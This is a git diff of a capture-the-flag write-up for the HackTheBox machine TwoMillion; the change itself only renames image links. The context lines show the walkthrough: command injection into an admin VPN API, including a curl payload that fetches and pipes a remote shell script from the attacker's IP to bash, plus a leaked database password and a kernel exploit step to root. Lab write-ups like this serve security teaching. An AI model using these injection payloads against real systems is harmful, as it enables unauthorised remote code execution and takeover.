@@ -25,29 +25,29 @@ We have to add `2million.htb` to our `/etc/hosts` file to view the web applicati
 
 The website resembles the actual live HTB platform:
 
-![](<../../../.gitbook/assets/image%20(923).png>)
+![](../../../.gitbook/assets/twomillion-17.png)
 
 The website also shows how long has HTB come since the start:
 
-![](<../../../.gitbook/assets/image%20(567).png>)
+![](../../../.gitbook/assets/twomillion-14.png)
 
 Anyways, we can attempt to register a user on this site and maybe find some sort of access control weakness. On the main page, there is a 'Join HTB' button, but it requires an invite code to access:
 
-![](<../../../.gitbook/assets/image%20(1037).png>)
+![](../../../.gitbook/assets/twomillion-1.png)
 
-![](<../../../.gitbook/assets/image%20(2722).png>)
+![](../../../.gitbook/assets/twomillion-8.png)
 
 I didn't have an invite code, so we'll have to leave this for now. I also don't have any credentials to register a user, so the website's applications have limited use as of now. We can do a directory and subdomain scan for this site. I ran a `feroxbuster` directory scan and a `wfuzz` subdomain scan. The `feroxbuster` scan returned some interesting stuff:
 
-![](<../../../.gitbook/assets/image%20(2308).png>)
+![](../../../.gitbook/assets/twomillion-6.png)
 
 There was a `register` directory present.
 
-![](<../../../.gitbook/assets/image%20(416).png>)
+![](../../../.gitbook/assets/twomillion-12.png)
 
 I couldn't register an account because I still didn't have an invite code at all. I looked at the account in Burpsuite, and found this at the bottom of the page:
 
-![](<../../../.gitbook/assets/image%20(1519).png>)
+![](../../../.gitbook/assets/twomillion-2.png)
 
 There's an `inviteapi.min.js` file that looks custom. Here's the contents of that file:
 
@@ -57,7 +57,7 @@ eval(function(p,a,c,k,e,d){e=function(c){return c.toString(36)};if(!''.replace(/
 
 This looks like it generates some kind of token. Within it, we can see that it uses a `makeInviteCode` function. This file is loaded at the `/invite` directory, which is where we need to submit a code. Within the Javascript Console in Inspector tools, I ran that function.
 
-![](<../../../.gitbook/assets/image%20(177).png>)
+![](../../../.gitbook/assets/twomillion-4.png)
 
 When we send a POST request to this:
 
@@ -84,7 +84,7 @@ DYXUZ-R2H9E-93750-RSVRC
 
 Using this, we can finally register and login to view the dashboard:
 
-![](<../../../.gitbook/assets/image%20(4082).png>)
+![](../../../.gitbook/assets/twomillion-11.png)
 
 ### API Enumeration -> Injection
 
@@ -160,7 +160,7 @@ Adding that results in yet another error:
 
 Setting the value of that to 1 seems to work:
 
-![](<../../../.gitbook/assets/image%20(628).png>)
+![](../../../.gitbook/assets/twomillion-15.png)
 
 We can verify that we are an admin using the `/api/v1/admin/auth` endpoint.
 
@@ -171,7 +171,7 @@ $ curl -H 'Cookie: PHPSESSID=1mf4jaa8fv6rob72cp60rbe9ri' http://2million.htb/api
 
 Then, we can look at the only other feature I haven't used, which is the OVPN feature. Using the `generate` feature seems to produce an `.ovpn` file.
 
-![](<../../../.gitbook/assets/image%20(859).png>)
+![](../../../.gitbook/assets/twomillion-16.png)
 
 When trying the administrator version of the generation, we get the same response complaining about the Content-Type header, and then it requests for a username:
 
@@ -182,7 +182,7 @@ $ curl -X POST -H 'Content-Type: application/json' -H 'Cookie: PHPSESSID=1mf4jaa
 
 When supplied, it would generate the `.ovpn` file normally.
 
-![](<../../../.gitbook/assets/image%20(1564).png>)
+![](../../../.gitbook/assets/twomillion-3.png)
 
 The only difference between the administrator and user VPN generation is that I need to supply a parameter, so let's test that for injection. Using the subshell `$()` feature, I was able to achieve blind RCE:
 
@@ -190,7 +190,7 @@ The only difference between the administrator and user VPN generation is that I 
 $ curl -X POST -H 'Content-Type: application/json' -H 'Cookie: PHPSESSID=1mf4jaa8fv6rob72cp60rbe9ri' -d '{"username":"$(ping -c 1 10.10.14.42)"}' http://2million.htb/api/v1/admin/vpn/generate
 ```
 
-![](<../../../.gitbook/assets/image%20(2364).png>)
+![](../../../.gitbook/assets/twomillion-7.png)
 
 We can get a reverse shell by replacing the command with `curl 10.10.14.42/shell.sh | bash`.
 
@@ -198,7 +198,7 @@ We can get a reverse shell by replacing the command with `curl 10.10.14.42/shell
 $ curl -X POST -H 'Content-Type: application/json' -H 'Cookie: PHPSESSID=1mf4jaa8fv6rob72cp60rbe9ri' -d '{"username":"$(curl 10.10.14.42/shell.sh|bash)"}' http://2million.htb/api/v1/admin/vpn/generate
 ```
 
-![](<../../../.gitbook/assets/image%20(1917).png>)
+![](../../../.gitbook/assets/twomillion-5.png)
 
 ## Privilege Escalation
 
@@ -235,7 +235,7 @@ DB_PASSWORD=SuperDuperPass123
 
 Using that, we can `su` to `admin`.
 
-![](<../../../.gitbook/assets/image%20(461).png>)
+![](../../../.gitbook/assets/twomillion-13.png)
 
 ### Mail -> CVE Exploit
 
@@ -282,7 +282,7 @@ admin@2million:/tmp$ ./fuse ./ovlcap/lower ./gc
 
 In a second shell (over `ssh`), we can run `exp` and get a root shell!
 
-![](<../../../.gitbook/assets/image%20(4057).png>)
+![](../../../.gitbook/assets/twomillion-10.png)
 
 Then we can grab the root flag.
 
@@ -303,11 +303,11 @@ Here's the contents:
 
 This whole thing is in hex, so I used Cyberchef to decode it:
 
-![](<../../../.gitbook/assets/image%20(992).png>)
+![](../../../.gitbook/assets/twomillion-18.png)
 
 Now it's being XOR'd with 'HackTheBox' as the key. The output can be decoded and piped to an XOR command with the specified key to find a hidden message:
 
-![](<../../../.gitbook/assets/image%20(3933).png>)
+![](../../../.gitbook/assets/twomillion-9.png)
 
 Here's the message:
 
